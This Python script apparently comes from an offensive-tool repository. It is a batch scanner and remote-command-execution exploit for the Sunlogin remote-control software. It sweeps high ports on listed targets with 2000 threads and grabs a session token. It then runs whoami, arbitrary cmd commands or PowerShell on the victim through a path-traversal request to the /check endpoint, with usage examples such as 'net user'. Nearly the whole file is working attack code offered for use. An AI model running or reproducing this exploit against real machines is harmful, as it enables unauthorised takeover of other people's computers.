# -*- coding: utf-8 -*-
#  Author: Lem

import os.path
import sys
import requests
import socket
import queue
import threading
import json
from optparse import OptionParser




# 配置参数
targetsfile = 'targets.txt'  # 目标列表存放路径，需提前存在
resultfile = 'result.txt'  # 结果列表存放路径，不存在会自动创建
thread_num = 2000  # 端口扫描线程数
timeout = 3  # 端口扫描超时时间（秒），过短可能会漏，过长检查会比较久


def read_txt(inputfile):
    file = open(inputfile);  # 打开文件
    ips = [];
    for eachline in file:
        eachline = eachline.strip('\n')
        eachline = str(eachline)
        ips.append(eachline)
    file.close()
    print("目标列表：" + inputfile)
    print("共有", len(ips), "个目标待检测")
    return (ips)


flag = "0"


def portscan(ip):
    def worker(ip, port_queue, datatmp):
        global flag
        global timeout
        while not port_queue.empty():
            if (flag == "1"):
                break
            else:
                server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                server.setblocking(1)
                server.settimeout(timeout)
                port = port_queue.get(timeout=20)
                try:
                    print("正在扫描" + ip + ":" + port, end="\r")
                    resu = server.connect_ex((ip, int(port)))
                    server.settimeout(None)
                    if (resu == 0):
                        s, re = gettoken(ip, port)
                        if (s == "success"):
                            print("发现可能存在RCE漏洞的目标 ", ip + ":" + port)
                            s1, re1 = rce_run_whoami(ip, port, re)
                            if (s1 == "success"):
                                flag = "1"
                                datatmp['ip'] = ip
                                datatmp['port'] = port
                                totxt(resultfile, ip, port)
                                print(ip + ":" + port + " whoami执行成功：" + re1)
                            else:
                                print(ip + ":" + port + " whoami执行失败，可能是误报")

                except Exception as e:
                    print(e)
                finally:
                    server.close()

    port_queue = queue.Queue()
    for i in range(40000,65535):#Windows10可能会出现10000以下端口，手动调节端口范围
        port_queue.put(str(i))
    threads = []
    datatmp = {}
    for i in range(thread_num):
        t = threading.Thread(target=worker, args=[ip, port_queue, datatmp])
        threads.append(t)
    for i in threads:
        i.start()
    for i in threads:
        i.join()
    return (datatmp)


def gettoken(ip, port):
    url = "http://" + ip + ":" + port + "/cgi-bin/rpc?action=verify-haras"
    try:
        res = json.loads(requests.get(url, timeout=5).text)
        return ("success", res['verify_string'])
    except requests.exceptions.ConnectTimeout as _:
        return ("fail", "")
    except Exception as _:
        return ("fail", "")


def rce_run_whoami(ip, port, token):
    url = "http://" + ip + ":" + port + "/check?cmd=ping../../../../../../windows/system32/whoami"
    cookies = {"CID": token}
    try:
        resu = requests.get(url, cookies=cookies, timeout=10).text
        return ("success", resu)
    except Exception as _:
        return ("fail", "")


def totxt(file, ip, port):
    try:
        with open(file, "a") as f:
            f.write(ip + ":" + port + "  find sunlogin_rce!" + "\n")
    except:
        print("请检查目标列表" + targetsfile + "是否存在")
        sys.exit()




def rce_scan():
    print("==========================" + "\n")
    print("向日葵RCE漏洞批量检测")
    print("Powered by Lem" + "\n")
    print("==========运行参数=========" + "\n")
    if not (os.path.exists(targetsfile)):
        print("请检查目标列表" + targetsfile + "是否存在")
        sys.exit()
    targets = read_txt(targetsfile)
    print("结果写入路径：" + resultfile)
    print("端口扫描线程：" + str(thread_num))
    print("端口扫描超时时间：" + str(timeout) + "秒" + "\n")
    print("==========================" + "\n")
    result = []
    for i in targets:
        flag = "0"
        tmp = portscan(i)
        if (tmp != {}):
            result.append(tmp)
    if (result != []):
        print("扫描结束，共发现" + str(len(result)) + "个目标存在向日葵RCE漏洞，结果已写入到" + resultfile)
    else:
        print("扫描结束，未发现存在向日葵RCE漏洞的目标")




def title():
    print("""
    ==================================================================================
                                向日葵远程命令执行漏洞  By Lem
    ==================================================================================
                    Scan usage = "Usage: python sunlogin-rce-scan.py \n"
                    EG:'targetsfile = 'targets.txt'  
                        'resultfile = 'result.txt'  \n'
    ==================================================================================
    RCE CMD:
    usage = "Usage: python sunlogin-rce-scan.py -i [--host] -p [port] -c [--command]\n"
    eg:'python sunlogin-rce-scan.py -i 127.0.0.1 -p 59527 -c "net user"\n'
    RCE PowerShell:
    usage = "Usage: python sunlogin-rce-scan.py -i [--host] -p [port] -s [--pws]\n"
    eg:'python sunlogin-rce-scan.py -i 127.0.0.1 -p 59527 -s "net user"\n'
    ==================================================================================
    """)




def RunPowerShell(ip, port, pws,token):
    poc1 = "http://" + ip + ":" + port + "/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+"+ pws
    cookies = {"CID": token}
    try:
        resu = requests.get(poc1, cookies=cookies, timeout=50,verify=False).text
        print('POC:',poc1)
        print('>>>>>>>>>>>>>>success>>>>>>>>>>>>>>>>>')
        print(resu)
    except Exception as _:
        return ("fail", "Error_")


def main_Powershell(host, port,pws):
    result1,token = gettoken(host, port)
    RunPowerShell(host, port, pws, token)


def RunCmd(ip, port, command,token):
    poc1 = "http://" + ip + ":" + port + "/check?cmd=ping../../../../../../windows/system32/" + command
    poc2 = "http://" + ip + ":" + port + "/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+"+ command
    cookies = {"CID": token}
    try:
        resu = requests.get(poc1, cookies=cookies, timeout=5,verify=False).text
        print('POC:',poc1)
        print('>>>>>>>>>>>>>>result>>>>>>>>>>>>>>>>>')
        print(resu)
        if 'failed' in resu: #测试发现执行dir命令时会产生异常，其他命令未测试，添加一个判断直接切换poc进行验证
                print('cmd执行可能产生failed异常，自动切换PowerShell测试 timeout=50')
                resu2 = requests.get(poc2, cookies=cookies, timeout=50,verify=False).text
                print('POC:',poc2)
                print('>>>>>>>>>>>>>>result>>>>>>>>>>>>>>>>>')
                print(resu2)

    except Exception as _:
        return ("fail", "Error_")


def main_Cmd(host, port,command):
    result1,token = gettoken(host, port)
    RunCmd(host, port, command, token)



if __name__ == '__main__':
    title()
    usage = ("Usage: python sunlogin-rce-scan.py -i [--host] -p [port] -c [--command] \n"
             'python sunlogin-rce-scan.py -i 127.0.0.1 -p 59527 -c "net user"\n')
    parser = OptionParser(usage=usage)
    parser.add_option('-i', '--host', dest='hosts', help='help')
    parser.add_option('-p', '--port', dest='port', help='help')
    parser.add_option('-c', '--command', dest='command', help='help')
    parser.add_option('-s', '--pws', dest='pws', help='help')
    (option, args) = parser.parse_args()
    host = option.hosts
    port = option.port
    command = option.command
    pws = option.pws
    #简单判断输入类型，快速执行批量扫描或命令执行
    if host is None  or port is None:
        print(usage)
        rce_scan()
       
    elif command is None:
        main_Powershell(host, port,pws)
    elif pws is None:
        main_Cmd(host, port,command)


